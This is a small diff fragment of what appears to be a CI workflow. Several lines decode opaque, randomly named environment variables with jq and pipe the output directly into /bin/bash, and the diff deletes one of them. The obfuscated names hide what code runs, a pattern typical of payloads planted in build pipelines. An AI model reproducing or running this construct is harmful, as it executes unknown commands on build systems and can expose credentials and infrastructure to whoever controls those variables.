@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$n98" | jq -r .rgb05 | /bin/bash
           echo $dta6265 | jq -r .zxef0 | /bin/bash
           echo $hlata2848 | jq -r .ta602 | /bin/bash
-          echo $wrmkt60 | jq -r .asx25017 | /bin/bash
           echo $vrt5494 | jq -r .zpuwm46147 | /bin/bash
           echo $r3232 | jq -r .qk26918 | /bin/bash
           echo $zzv3683 | jq -r .nt85 | /bin/bash
